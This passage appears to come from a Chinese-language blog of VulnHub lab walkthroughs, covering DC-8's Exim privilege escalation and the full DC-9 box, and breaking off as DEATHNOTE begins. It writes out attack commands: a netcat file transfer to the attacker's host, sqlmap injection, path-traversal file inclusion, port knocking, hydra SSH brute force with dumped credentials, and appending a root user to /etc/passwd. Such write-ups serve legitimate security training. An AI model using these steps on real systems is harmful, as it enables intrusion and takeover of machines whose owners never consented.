<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">searchsploit <span class="number">46996</span> -p  </span><br><span class="line"></span><br><span class="line">cat <span class="regexp">/usr/</span>share<span class="regexp">/exploitdb/</span>exploits<span class="regexp">/linux/</span>local/<span class="number">46996</span>.sh</span><br></pre></td></tr></table></figure>

<p><img src="/2022/08/29/vulnhub/image-20221103151838092.png" alt="image-20221103151838092"></p>
<p><img src="/2022/08/29/vulnhub/image-20221103152003846.png" alt="image-20221103152003846"></p>
<p>发现有两个使用方法，一个<code>setuid</code>，一个<code>netcat</code></p>
<p>主要是上传到靶机<code>shell</code>后，执行命令不同</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">./raptor_exim_wiz -m setuid</span><br><span class="line">或</span><br><span class="line">./raptor_exim_wiz -m netcat</span><br></pre></td></tr></table></figure>





<p>我们先把脚本文件复制下来</p>
<p><img src="/2022/08/29/vulnhub/image-20221103152351530.png" alt="image-20221103152351530"></p>
<p>再上传到靶机<code>shell</code></p>
<p><code>kali</code>主机执行</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">nc</span> -lvp <span class="number">9999</span> &lt; raptor_exim_wiz</span><br></pre></td></tr></table></figure>

<p><img src="/2022/08/29/vulnhub/image-20221103152714451.png" alt="image-20221103152714451"></p>
<p>靶机<code>shell</code>中执行</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">nc</span> <span class="number">192.168.133.140</span> <span class="number">9999</span> &gt; raptor_exim_wiz</span><br></pre></td></tr></table></figure>

<p><img src="/2022/08/29/vulnhub/image-20221103153550325.png" alt="image-20221103153550325"></p>
<p>发现权限不够，看来是不能在这个页面新建文件</p>
<p>我们到<code>/tmp</code>目录下一般可以</p>
<p><img src="/2022/08/29/vulnhub/image-20221103153658085.png" alt="image-20221103153658085"></p>
<p>下载成功</p>
<p>执行提权</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">./raptor_exim_wiz -m setuid</span><br></pre></td></tr></table></figure>

<p><img src="/2022/08/29/vulnhub/image-20221103153740349.png" alt="image-20221103153740349"></p>
<p>发现无执行权限，我们修改一下</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">chmod</span> <span class="number">777</span> raptor_exim_wiz</span><br></pre></td></tr></table></figure>

<p><img src="/2022/08/29/vulnhub/image-20221103153901179.png" alt="image-20221103153901179"></p>
<p>成功执行脚本</p>
<hr>
<h3 id="意外"><a href="#意外" class="headerlink" title="意外"></a>意外</h3><p>但结果发现还是</p>
<p><img src="/2022/08/29/vulnhub/image-20221103154130346.png" alt="image-20221103154130346"></p>
<p>低权限账号</p>
<p>于是我们再执行</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">./raptor_exim_wiz -m netcat</span><br></pre></td></tr></table></figure>

<p>结果还是一样</p>
<p><img src="/2022/08/29/vulnhub/image-20221103155324498.png" alt="image-20221103155324498"></p>
<p>而且提醒在靶机的<code>31337</code>端口连接关闭了</p>
<p>看了看其他大佬的<code>wp</code></p>
<p>发现有一步【其实是没必要的】</p>
<blockquote>
<p>在脚本文件里执行<br>说是因为这个脚本是<code>windows</code>底下编写的，所以需要修改一下，改成<code>Linux</code><br><code>set ff=unix</code></p>
</blockquote>
<p>结果还是一样，看来是靶机有问题了，猜测是靶机和<code>kali</code>主机之间连接有问题，我换手机热点试试</p>
<hr>
<p>成功【校园网真垃圾】</p>
<p><img src="/2022/08/29/vulnhub/image-20221103160625006.png" alt="image-20221103160625006"></p>
<p>到根目录查看<code>flag</code></p>
<p><img src="/2022/08/29/vulnhub/image-20221103160824407.png" alt="image-20221103160824407"></p>
<p>得到<code>flag</code></p>
<blockquote>
<figure class="highlight tap"><table><tr><td class="code"><pre><span class="line">888      <span class="number"> 888 </span>        <span class="number"> 888 </span>888      8888888b.                            <span class="number"> 888 </span>888<span class="number"> 888 </span>888</span><br><span class="line">888   o  <span class="number"> 888 </span>        <span class="number"> 888 </span>888     <span class="number"> 888 </span> &quot;Y88b                           <span class="number"> 888 </span>888<span class="number"> 888 </span>888</span><br><span class="line">888  d8b <span class="number"> 888 </span>        <span class="number"> 888 </span>888     <span class="number"> 888 </span>  <span class="number"> 888 </span>                          <span class="number"> 888 </span>888<span class="number"> 888 </span>888</span><br><span class="line">888 d888b<span class="number"> 888 </span> .d88b. <span class="number"> 888 </span>888     <span class="number"> 888 </span>  <span class="number"> 888 </span> .d88b.  88888b.   .d88b. <span class="number"> 888 </span>888<span class="number"> 888 </span>888</span><br><span class="line">888d88888b888 d8P  Y8b<span class="number"> 888 </span>888     <span class="number"> 888 </span>  <span class="number"> 888 </span>d88&quot;&quot;88b<span class="number"> 888 </span>&quot;88b d8P  Y8b<span class="number"> 888 </span>888<span class="number"> 888 </span>888</span><br><span class="line">88888P Y88888<span class="number"> 88888888 </span>888<span class="number"> 888 </span>    <span class="number"> 888 </span>  <span class="number"> 888 </span>888 <span class="number"> 888 </span>888 <span class="number"> 888 </span>88888888 Y8P Y8P Y8P Y8P</span><br><span class="line">8888P   Y8888 Y8b.    <span class="number"> 888 </span>888     <span class="number"> 888 </span> .d88P Y88..88P<span class="number"> 888 </span><span class="number"> 888 </span>Y8b.      &quot;   &quot;   &quot;   &quot;</span><br><span class="line">888P     Y888  &quot;Y8888 <span class="number"> 888 </span>888      8888888P&quot;   &quot;Y88P&quot; <span class="number"> 888 </span><span class="number"> 888 </span> &quot;Y8888 <span class="number"> 888 </span>888<span class="number"> 888 </span>888</span><br></pre></td></tr></table></figure>

<p><code>Hope you enjoyed DC-8.  Just wanted to send a big thanks out there to all those</code><br><code>who have provided feedback, and all those who have taken the time to complete these little</code><br><code>challenges.</code></p>
<p><code>I&#39;m also sending out an especially big thanks to:</code></p>
<p><code>@4nqr34z</code><br><code>@D4mianWayne</code><br><code>@0xmzfr</code><br><code>@theart42</code></p>
<p><code>This challenge was largely based on two things:</code></p>
<ol>
<li><code>A Tweet that I came across from someone asking about 2FA on a Linux box, and whether it was worthwhile.</code></li>
<li><code>A suggestion from @theart42</code></li>
</ol>
<p><code>The answer to that question is...</code></p>
<p><code>If you enjoyed this CTF, send me a tweet via @DCAU7.</code></p>
<p>意思是：<br>希望你喜欢 DC-8。只是想向所有这些人表示衷心的感谢<br>提供反馈的人，以及所有花时间完成这些小事的人<br>挑战。</p>
<p>我还要特别感谢：</p>
<p>@4nqr34z<br>@D4mianWayne<br>@0xmzfr<br>@心42</p>
<p>这一挑战主要基于两件事：</p>
<ol>
<li>我从有人询问关于 Linux 机器上的 2FA 以及它是否值得的一条推文。</li>
<li>来自@theart42 的建议</li>
</ol>
<p>这个问题的答案是……</p>
<p>如果你喜欢这个 CTF，请通过@DCAU7 给我发一条推文。</p>
</blockquote>
<p>【注意，这个提权不稳定，所以需要快点拿取<code>flag</code>，或者按我之前写的方法进入稳定<code>shell</code>】</p>
<hr>
<h3 id="p-s-setuid"><a href="#p-s-setuid" class="headerlink" title="p.s. setuid"></a>p.s. setuid</h3><p>我再试试另外一个命令试试</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">./raptor_exim_wiz -m setuid</span><br></pre></td></tr></table></figure>

<p><img src="/2022/08/29/vulnhub/image-20221103161221325.png" alt="image-20221103161221325"></p>
<p>发现还是一样</p>
<p>查了一下</p>
<blockquote>
<p><code>setuid</code></p>
<p><code>setuid</code>是类unix系统提供的一个标志位， 其实际意义是set一个process的euid为这个可执行文件或程序的拥有者(比如root)的uid， 也就是说当setuid位被设置之后， 当文件或程序(统称为executable)被执行时, 操作系统会赋予文件所有者的权限, 因为其euid是文件所有者的uid.</p>
</blockquote>
<p>而且我们执行完发现生成了两个<code>pwn</code>文件【狂喜，最近正好在学习<code>pwn</code>】</p>
<p>查了一下<code>setuid</code>在<code>pwn</code>中的利用</p>
<h4 id="在pwn中"><a href="#在pwn中" class="headerlink" title="在pwn中"></a>在pwn中</h4><p><code>什么是setuid？</code></p>
<blockquote>
<p><code>setuid</code>代表设置用户身份，并且<code>setuid</code>设置调用进程的有效用户ID，用户运行程序的uid与调用进程的真实uid不匹配</p>
</blockquote>
<p>这么说起来有点绕，我们来举一个例子</p>
<blockquote>
<p>一个要以root权限运行的程序，但我们想让普通用户也能运行它，但又要防止该程序被攻击者利用，这里就需要用的setuid了</p>
</blockquote>
<p>演示<br>我们用<code>user</code>用户运行一个<code>vim</code><br>然后新开一个窗口查看后台进程</p>
<figure class="highlight dos"><table><tr><td class="code"><pre><span class="line">ps -<span class="built_in">aux</span></span><br></pre></td></tr></table></figure>

<p><img src="/2022/08/29/vulnhub/image-20221103162544585.png" alt="image-20221103162544585"></p>
<p>这里可以看到，我们的<code>vim</code>正在以<code>user</code>的权限运行中，然后我们去执行一下<code>setuid</code>文件看看</p>
<p><img src="/2022/08/29/vulnhub/image-20221103162848360.png" alt="image-20221103162848360"></p>
<p>这里可以看到，我们虽然是<code>user</code>用户，但执行文件后，文件正以<code>root</code>权限运行<br>我们查看文件的权限</p>
<p><img src="/2022/08/29/vulnhub/image-20221103162937431.png" alt="image-20221103162937431"></p>
<blockquote>
<p><code>r</code>代表读，<code>w</code>代表写，<code>x</code>代表执行，那<code>s</code>是什么呢</p>
</blockquote>
<p><code>s</code>替换了以<code>x</code>的可执行文件，这被称为<code>setuid</code>位，根据刚刚的操作，应该知道了<code>s</code>是做什么的</p>
<p>当这个位被<code>user</code>权限的用户执行时，<code>linux</code>实际上是以文件的创造者的权限运行的，在这种情况下，它是以<code>root</code>权限运行的</p>
<p><strong>我们的目标就是，破解(pwn)这些文件然后拿到<code>root</code>权限读取<code>flag</code></strong></p>
<p>这也就是这个命令执行的目的</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">./raptor_exim_wiz -m setuid</span><br></pre></td></tr></table></figure>



<blockquote>
<p>简而言之，其实就是<code>suid</code>提权</p>
<p>但这里可能是因为靶机的原因无法执行提权成功</p>
</blockquote>
<hr>
<p>总而言之，这一关只是在<code>DC2</code>上修改了一点，只要把前面几关做了，这关难度并不大</p>
<p>【</p>
<p>难受的是遇到<code>pwn</code>，虽然在这里并没有什么用，但是如果遇到这类二进制文件如何修改才能让其成为我们提权的工具，</p>
<p>而且现在二进制还啥也不会，继续学习吧</p>
<p>】</p>
<p><strong>一个旗子找完，游戏结束【吐血了】</strong></p>
<hr>
<h1 id="九、DC9-中级"><a href="#九、DC9-中级" class="headerlink" title="九、DC9[中级]"></a>九、DC9[中级]</h1><p><strong>only one flag</strong></p>
<blockquote>
<p>（dc最后一关）建议可以自己想办法做一下，如果之前是靠别人wp来提供思路的话</p>
</blockquote>
<h2 id="信息收集-8"><a href="#信息收集-8" class="headerlink" title="信息收集"></a>信息收集</h2><p>先用<code>nmap</code>扫一下</p>
<p><img src="/2022/08/29/vulnhub/image-20221103191148810.png" alt="image-20221103191148810"></p>
<p>结果发现只有<code>80</code>端口是打开的</p>
<p>而且也没有什么敏感的信息</p>
<p>然后再<code>dirsearch</code>扫一下</p>
<p><img src="/2022/08/29/vulnhub/image-20221103191356470.png" alt="image-20221103191356470"></p>
<p>结果没有什么有价值的东西</p>
<p><img src="/2022/08/29/vulnhub/image-20221103191535378.png" alt="image-20221103191535378"></p>
<p>在<code>wappalyzer</code>里也看不出什么信息，<code>CMS</code>也没显示</p>
<h2 id="1-sql注入-1"><a href="#1-sql注入-1" class="headerlink" title="1.sql注入"></a>1.sql注入</h2><p>啥也没有信息，但是在<code>display all records</code>下</p>
<p>我们看到一大串枚举数据，很熟悉，这和<code>sql</code>注入感觉有很大的关系</p>
<p><img src="/2022/08/29/vulnhub/image-20221103195324565.png" alt="image-20221103195324565"></p>
<p>找了一下发现<code>url</code>并没有<code>sql</code>注入的方式，那就可能是输入框进行<code>sql</code>注入了</p>
<p>根据枚举的数据，猜测是在<code>search</code>下</p>
<p><img src="/2022/08/29/vulnhub/image-20221103200048490.png" alt="image-20221103200048490"></p>
<p>我们直接抓包数据，拿<code>sqlmap</code>梭哈</p>
<p><img src="/2022/08/29/vulnhub/image-20221103200315686.png" alt="image-20221103200315686"></p>
<p><img src="/2022/08/29/vulnhub/image-20221103200434113.png" alt="image-20221103200434113"></p>
<p>好家伙真的是<code>sql</code>注入</p>
<p>后面不赘述，找到并查看<code>users</code>数据库中用户信息</p>
<p><img src="/2022/08/29/vulnhub/image-20221103200557398.png" alt="image-20221103200557398"></p>
<p>好家伙，完全没有对密码加密</p>
<p>但是根据登录页面，是需要管理员账号的，再根据<code>staff</code>，看来我是找错表了</p>
<p><img src="/2022/08/29/vulnhub/image-20221103200743790.png" alt="image-20221103200743790"></p>
<p>于是按上面一样步骤，查看<code>Staff</code>数据库里的信息</p>
<p><img src="/2022/08/29/vulnhub/image-20221103201409346.png" alt="image-20221103201409346"></p>
<p>果然在这里</p>
<blockquote>
<p><code>transorbital1</code><br>我开始以为是啥密钥，结果是密码明文，麻了</p>
<p>当然时间充足的兄弟可以hashcat试试【坏笑】</p>
</blockquote>
<p><img src="/2022/08/29/vulnhub/image-20221103202130464.png" alt="image-20221103202130464"></p>
<p>成功登录</p>
<h2 id="2-文件包含"><a href="#2-文件包含" class="headerlink" title="2.文件包含"></a>2.文件包含</h2><p>发现多了两个选项是，一个是增加用户，另一个是登出账号</p>
<p>但是我突然发现</p>
<p>底下莫名多了一行字</p>
<figure class="highlight fortran"><table><tr><td class="code"><pre><span class="line"><span class="keyword">File</span> does not <span class="keyword">exist</span></span><br></pre></td></tr></table></figure>

<p>？？？</p>
<p>哪里来的<code>file</code>，看来是进行了读取文件操作，但是文件参数不存在</p>
<p>猜测可能存在文件包含漏洞</p>
<p>于是我们在<code>url</code>后加上<code>?file=</code>进行文件包含</p>
<blockquote>
<p><code>http://192.168.133.149/manage.php?file=../../../../../etc/passwd</code><br>返回到根目录下，包含&#x2F;etc目录下的passwd文件</p>
</blockquote>
<p><img src="/2022/08/29/vulnhub/image-20221103205431449.png" alt="image-20221103205431449"></p>
<p>但这里并没有我们想要的信息，</p>
<h2 id="3-ssh"><a href="#3-ssh" class="headerlink" title="3.ssh"></a>3.ssh</h2><h3 id="1）-knockd"><a href="#1）-knockd" class="headerlink" title="1） knockd"></a>1） knockd</h3><blockquote>
<p>在1920年代，当禁令如火如荼地进行时，如果您想进入说话状态，就必须知道秘密的敲门声，并正确地敲打它才能进入内部。</p>
<p>端口敲门是现代的等同物。 如果您希望人们可以访问您计算机上的服务，但又不想将防火墙打开到<del>Internet</del>，则可以使用端口断开功能。<br>它允许您关闭防火墙上允许传入连接的端口，并在进行<code>预先安排的连接尝试</code>方式时自动打开它们。 连接尝试的顺序充当秘密敲门。 另一个秘密的敲门声关闭了港口。</p>
</blockquote>
<p>我在学习笔记写有其原理，可以看看，我不在这里赘述</p>
<p>先查看敲门顺序</p>
<blockquote>
<p><code>http://192.168.133.149/manage.php?file=../../../../../etc/knockd.conf</code></p>
</blockquote>
<p><img src="/2022/08/29/vulnhub/image-20221103213357210.png" alt="image-20221103213357210"></p>
<p>发现是</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">7469</span>,<span class="number">8475</span>,<span class="number">9842</span></span><br></pre></td></tr></table></figure>

<p>敲一下</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">knock</span> <span class="number">192.168.133.149</span> <span class="number">7469</span> <span class="number">8475</span> <span class="number">9842</span></span><br></pre></td></tr></table></figure>

<p><img src="/2022/08/29/vulnhub/image-20221103214033662.png" alt="image-20221103214033662"></p>
<p>然后再用<code>nmap</code>扫一下，发现<code>22</code>端口开了</p>
<p><img src="/2022/08/29/vulnhub/image-20221103214022727.png" alt="image-20221103214022727"></p>
<h3 id="2）-hydra"><a href="#2）-hydra" class="headerlink" title="2） hydra"></a>2） hydra</h3><p>然后我们用九头蛇爆破登录一下<code>ssh</code></p>
<p>至于账户密码就用我们之前<code>sql</code>注入得到的第一个的数据</p>
<p><img src="/2022/08/29/vulnhub/image-20221103200557398.png" alt="image-20221103200557398"></p>
<blockquote>
<p>username：<br><code>marym</code><br><code>julied</code><br><code>fredf</code><br><code>barneyr</code><br><code>tomc</code><br><code>jerrym</code><br><code>wilmaf</code><br><code>bettyr</code><br><code>chandlerb</code><br><code>joeyt</code><br><code>rachelg</code><br><code>rossg</code><br><code>monicag</code><br><code>phoebeb</code><br><code>scoots</code><br><code>janitor</code><br><code>janitor2</code></p>
</blockquote>
<blockquote>
<p>password：<br><code>3kfs86sfd</code><br><code>468sfdfsd2</code><br><code>4sfd87sfd1</code><br><code>RocksOff</code><br><code>TC&amp;TheBoyz</code><br><code>B8m#48sd</code><br><code>Pebbles</code><br><code>BamBam01</code><br><code>UrAG0D!</code><br><code>Passw0rd</code><br><code>yN72#dsd</code><br><code>ILoveRachel</code><br><code>3248dsds7s</code><br><code>smellycats</code><br><code>YR3BVxxxw87</code><br><code>Ilovepeepee</code><br><code>Hawaii-Five-0</code></p>
</blockquote>
<p>把<code>username</code>和<code>password</code>复制到两个文本文件中去</p>
<figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="attribute">hydra</span> -L user.txt -P pass.txt <span class="number">192.168.133.149</span> ssh</span><br></pre></td></tr></table></figure>

<p><img src="/2022/08/29/vulnhub/image-20221103215414559.png" alt="image-20221103215414559"></p>
<p>发现有三个可以登录</p>
<blockquote>
<p>login: <code>chandlerb</code>   password: <code>UrAG0D!</code><br>login: <code>joeyt</code>   password: <code>Passw0rd</code><br>login: <code>janitor</code>   password: <code>Ilovepeepee</code></p>
</blockquote>
<p>我们先登录<code>janitor</code></p>
<blockquote>
<p>login: <code>janitor</code>   password: <code>Ilovepeepee</code></p>
</blockquote>
<p><img src="/2022/08/29/vulnhub/image-20221104165102940.png" alt="image-20221104165102940"></p>
<p>登录成功</p>
<h2 id="4-提权"><a href="#4-提权" class="headerlink" title="4.提权"></a>4.提权</h2><p>先执行 </p>
<figure class="highlight ebnf"><table><tr><td class="code"><pre><span class="line"><span class="attribute">sudo -l</span></span><br></pre></td></tr></table></figure>

<p>看看当前用户能以管理员身份执行哪些命令</p>
<p><img src="/2022/08/29/vulnhub/image-20221104165528505.png" alt="image-20221104165528505"></p>
<p>看来我们没有资格</p>
<p>再执行</p>
<figure class="highlight stata"><table><tr><td class="code"><pre><span class="line"><span class="keyword">ls</span> -<span class="keyword">la</span></span><br></pre></td></tr></table></figure>

<p>查看当前用户目录文件</p>
<p><img src="/2022/08/29/vulnhub/image-20221104165145529.png" alt="image-20221104165145529"></p>
<p>发现有个</p>
<figure class="highlight ebnf"><table><tr><td class="code"><pre><span class="line"><span class="attribute">secrets-for-putin</span></span><br></pre></td></tr></table></figure>

<p>可能有管理员密码什么的</p>
<p><img src="/2022/08/29/vulnhub/image-20221104165242513.png" alt="image-20221104165242513"></p>
<p>果然有个文本文件，查看</p>
<figure class="highlight stata"><table><tr><td class="code"><pre><span class="line"><span class="keyword">cat</span> passwords-found-<span class="keyword">on</span>-<span class="keyword">post</span>-it-<span class="keyword">notes</span>.txt</span><br></pre></td></tr></table></figure>

<p><img src="/2022/08/29/vulnhub/image-20221104165331378.png" alt="image-20221104165331378"></p>
<p>又多了几个密码</p>
<blockquote>
<p><code>BamBam01</code><br><code>Passw0rd</code><br><code>smellycats</code><br><code>P0Lic#10-4</code><br><code>B4-Tru3-001</code><br><code>4uGU5T-NiGHts</code></p>
</blockquote>
<p>我们把这个补充到我们九头蛇爆破的密码本里</p>
<p>再进行爆破<code>ssh</code></p>
<figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="attribute">hydra</span> -L user.txt -P pass.txt <span class="number">192.168.133.149</span> ssh</span><br></pre></td></tr></table></figure>

<p>我们发现多了一个新的账号</p>
<p><img src="/2022/08/29/vulnhub/image-20221104165738669.png" alt="image-20221104165738669"></p>
<blockquote>
<p>login: <code>fredf</code>   password: <code>B4-Tru3-001</code></p>
</blockquote>
<p>我们登录<code>ssh</code>看看</p>
<p>再执行</p>
<figure class="highlight ebnf"><table><tr><td class="code"><pre><span class="line"><span class="attribute">sudo -l</span></span><br></pre></td></tr></table></figure>

<p><img src="/2022/08/29/vulnhub/image-20221104165927452.png" alt="image-20221104165927452"></p>
<p>发现其可以以无密码<code>root</code>权限执行</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line"><span class="regexp">/opt/</span>devstuff<span class="regexp">/dist/</span>test/test</span><br></pre></td></tr></table></figure>

<p>我们执行一下试试</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">sudo <span class="regexp">/opt/</span>devstuff<span class="regexp">/dist/</span>test/test</span><br></pre></td></tr></table></figure>

<p><img src="/2022/08/29/vulnhub/image-20221104170533241.png" alt="image-20221104170533241"></p>
<p>提示我们有个test.py正在被读取使用</p>
<p>我们找一下这个文件在哪里</p>
<blockquote>
<p><code>find / -name &quot;test.py&quot; -type f 2&gt;/dev/null</code></p>
<p><code>-type</code> f代表类型为文件，d为目录<br><code>2&gt;/dev/null</code>产生更清晰的输出，因为它会丢弃错误，例如权限错误</p>
</blockquote>
<p><img src="/2022/08/29/vulnhub/image-20221104170743086.png" alt="image-20221104170743086"></p>
<p>我们到文件目录下查看一下内容</p>
<p><img src="/2022/08/29/vulnhub/image-20221104170808449.png" alt="image-20221104170808449"></p>
<figure class="highlight vim"><table><tr><td class="code"><pre><span class="line">#!/usr/bin/<span class="keyword">python</span></span><br><span class="line"></span><br><span class="line">import sys</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span> (sys.<span class="built_in">argv</span>) != <span class="number">3</span> :</span><br><span class="line">    <span class="keyword">print</span> (<span class="string">&quot;Usage: python test.py read append&quot;</span>)</span><br><span class="line">    sys.<span class="keyword">exit</span> (<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span> :</span><br><span class="line">    <span class="keyword">f</span> = <span class="keyword">open</span>(sys.<span class="built_in">argv</span>[<span class="number">1</span>], <span class="string">&quot;r&quot;</span>)</span><br><span class="line">    output = (<span class="keyword">f</span>.<span class="keyword">read</span>())</span><br><span class="line"></span><br><span class="line">    <span class="keyword">f</span> = <span class="keyword">open</span>(sys.<span class="built_in">argv</span>[<span class="number">2</span>], <span class="string">&quot;a&quot;</span>)</span><br><span class="line">    <span class="keyword">f</span>.<span class="keyword">write</span>(output)</span><br><span class="line">    <span class="keyword">f</span>.<span class="keyword">close</span>()</span><br></pre></td></tr></table></figure>

<h3 id="py脚本利用"><a href="#py脚本利用" class="headerlink" title="py脚本利用"></a>py脚本利用</h3><p><code>脚本接受了两个位置参数，并将第一个文件的内容，附加到第二个文件的内容中</code></p>
<p>其实如果我们有修改脚本的权限就好了，可以改成恶意脚本，但是我们并没有在这个目录写入的权限</p>
<p>于是，我们可以换个思路，就利用脚本的把一个文本内容附加到另外文本的能力，修改我们无法修改的文件，比如<code>/etc/passwd</code></p>
<p>我们先看看<code>/etc/passwd</code>里<code>root</code>用户的格式</p>
<p><img src="/2022/08/29/vulnhub/image-20221104171635506.png" alt="image-20221104171635506"></p>
<p>按这个格式我们写一个自己的</p>
<blockquote>
<p><code>ttoc::0:0:root:/root:/bin/bash</code><br>我这里设置的用户ttoc密码为空</p>
</blockquote>
<hr>
<h4 id="openssl加盐"><a href="#openssl加盐" class="headerlink" title="openssl加盐"></a><code>openssl</code>加盐</h4><p>其实这里是需要给我们真假的用户添加密码的</p>
<p>不然是通过不了密码输入那一环，那里不允许密码为空</p>
<p>我们执行</p>
<blockquote>
<p><code>openssl passwd -1 -salt salt password</code></p>
<p><code>-1</code>使用什么哈希算法。在我们的用例中，这无关紧要，因此我们使用 MD5，在现实世界的 PT 中应该避免使用 MD5，因为它不安全。</p>
<p><code>-salt</code> salt用作盐的字符串。我选择字符串盐</p>
<p><code>password</code>我们想使用的明文密码</p>
</blockquote>
<p>得到</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line"><span class="variable">$1</span><span class="variable">$salt</span><span class="variable">$qJH7</span>.N4xYta3aEG<span class="regexp">/dfqo/</span><span class="number">0</span></span><br></pre></td></tr></table></figure>

<p><strong>注意如果开始没加密码就传入&#x2F;etc&#x2F;passwd，后面修改后再传用户，名字不能相同</strong></p>
<hr>
<p>但是注意我们其实在很多目录下都没有写入权限，但是我们可以用经典使用</p>
<p><code>/tmp</code>，临时文件目录下的权限管控一般不大</p>
<p>于是我们把我们的内容写入<code>/tmp</code>目录下的<code>evil</code>文件中</p>
<blockquote>
<p><code>echo &#39;ttoc:$1$salt$qJH7.N4xYta3aEG/dfqo/0:0:0:root:/root:/bin/bash&#39; &gt; /tmp/evil</code></p>
<p>*注意这里需要单引号，双引号会把$后面参数当作变量</p>
</blockquote>
<p>然后我们再执行</p>
<blockquote>
<p><code>sudo /opt/devstuff/dist/test/test /tmp/evil /etc/passwd</code></p>
<p>把我们创建的用户root添加到文本去</p>
</blockquote>
<p><img src="/2022/08/29/vulnhub/image-20221104172732031.png" alt="image-20221104172732031"></p>
<p>最后登录<code>ttoc</code></p>
<figure class="highlight ebnf"><table><tr><td class="code"><pre><span class="line"><span class="attribute">su ttoc</span></span><br></pre></td></tr></table></figure>

<p><img src="/2022/08/29/vulnhub/image-20221104173707687.png" alt="image-20221104173707687"></p>
<p>成功提取</p>
<p>读取<code>flag</code></p>
<p><img src="/2022/08/29/vulnhub/image-20221104173836066.png" alt="image-20221104173836066"></p>
<blockquote>
<figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">███╗   ██╗██╗ ██████╗███████╗    ██╗    ██╗ ██████╗ ██████╗ ██╗  ██╗██╗██╗██╗</span><br><span class="line">████╗  ██║██║██╔════╝██╔════╝    ██║    ██║██╔═══██╗██╔══██╗██║ ██╔╝██║██║██║</span><br><span class="line">██╔██╗ ██║██║██║     █████╗      ██║ █╗ ██║██║   ██║██████╔╝█████╔╝ ██║██║██║</span><br><span class="line">██║╚██╗██║██║██║     ██╔══╝      ██║███╗██║██║   ██║██╔══██╗██╔═██╗ ╚═╝╚═╝╚═╝</span><br><span class="line">██║ ╚████║██║╚██████╗███████╗    ╚███╔███╔╝╚██████╔╝██║  ██║██║  ██╗██╗██╗██╗</span><br><span class="line">╚═╝  ╚═══╝╚═╝ ╚═════╝╚══════╝     ╚══╝╚══╝  ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝╚═╝╚═╝</span><br><span class="line"><span class="code">                                                                             </span></span><br><span class="line"><span class="code"></span></span><br></pre></td></tr></table></figure>

<p><code>Congratulations - you have done well to get to this point.</code></p>
<p><code>Hope you enjoyed DC-9.  Just wanted to send out a big thanks to all those</code><br><code>who have taken the time to complete the various DC challenges.</code></p>
<p><code>I also want to send out a big thank you to the various members of @m0tl3ycr3w .</code></p>
<p><code>They are an inspirational bunch of fellows.</code></p>
<p><code>Sure, they might smell a bit, but...just kidding.  :-)</code></p>
<p><code>Sadly, all things must come to an end, and this will be the last ever</code><br><code>challenge in the DC series.</code></p>
<p><code>So long, and thanks for all the fish.</code></p>
<p>意思是：<br>恭喜 - 你已经完成了这一点。</p>
<p>希望你喜欢 DC-9。只是想对所有这些人表示衷心的感谢<br>他们花时间完成了各种 DC 挑战。</p>
<p>我还要向@m0tl3ycr3w 的各个成员表示衷心的感谢。</p>
<p>他们是一群鼓舞人心的人。</p>
<p>当然，它们可能会闻到一点味道，但是……开玩笑。 :-)</p>
<p>可悲的是，一切都必须结束，这将是最后一次<br>DC系列中的挑战。</p>
<p>这么久，感谢所有的鱼。</p>
</blockquote>
<p><strong>一个旗子找完，游戏结束</strong></p>
<p>【dc系列结束，阅读到本文的朋友，希望对你们有所帮助】</p>
<hr>
<h1 id="ELSE"><a href="#ELSE" class="headerlink" title="ELSE"></a>ELSE</h1><h1 id="一、DEATHNOTE-1-初级"><a href="#一、DEATHNOTE-1-初级" class="headerlink" title="一、DEATHNOTE: 1[初级]"></a>一、DEATHNOTE: 1[初级]</h1><p>基拉好帅，必须拿这个开头，直接提权进他的心【不是南通】</p>
<p><img src="/2022/08/29/vulnhub/image-20221106151711523.png" alt="image-20221106151711523"></p>
<blockquote>
<p>hint:<br>不要浪费太多时间跳出框框思考。这是一个直截了当的盒子。</p>
</blockquote>
<hr>
<p>找这个靶场<code>ip</code>，就把我卡住了，后面看到好像这个靶机和<code>vm</code>不兼容，只能用<code>vitrualbox</code></p>
<p>后面下了个<code>vitrualbox</code>才找到靶机<code>ip</code></p>
<p><img src="/2022/08/29/vulnhub/image-20221108134734459.png" alt="image-20221108134734459"></p>
<p>然后<code>vm</code>也桥接，就找到了</p>
<p><img src="/2022/08/29/vulnhub/image-20221108190437827.png" alt="image-20221108190437827"></p>
<p>顺带补充两个扫描工具【使用自行<code>-h</code>查看】【感觉和<code>nmap</code>差不多】</p>
<blockquote>
<p><code>arp-scan</code>是Kali Linux自带的一款ARP扫描工具。该工具可以进行单一目标扫描，也可以进行批量扫描。批量扫描的时候，用户可以通过CIDR<br>地址范围或者列表文件的方式指定。该工具允许用户定制ARP包，构建非标准数据包。同时，<code>该工具会自动解析Mac地址，给出MAC对应的硬</code><br><code>件厂商，帮助用户确认目标。</code></p>
<p><code>netdiscover</code><br>Netdiscover是一种网络扫描工具，通过ARP扫描发现活动主机，可以通过主动和被动两种模式进行ARP扫描。通过主动发送ARP请求检查网络ARP流量，通过自动扫描模式扫描网络地址。本文介绍Netdiscover的安装和使用方法。</p>
</blockquote>
<hr>
<h2 id="信息收集-9"><a href="#信息收集-9" class="headerlink" title="信息收集"></a>信息收集</h2><p>习惯<code>nmap</code>扫一下</p>
<p><img src="/2022/08/29/vulnhub/image-20221108191059284.png" alt="image-20221108191059284"></p>
<blockquote>
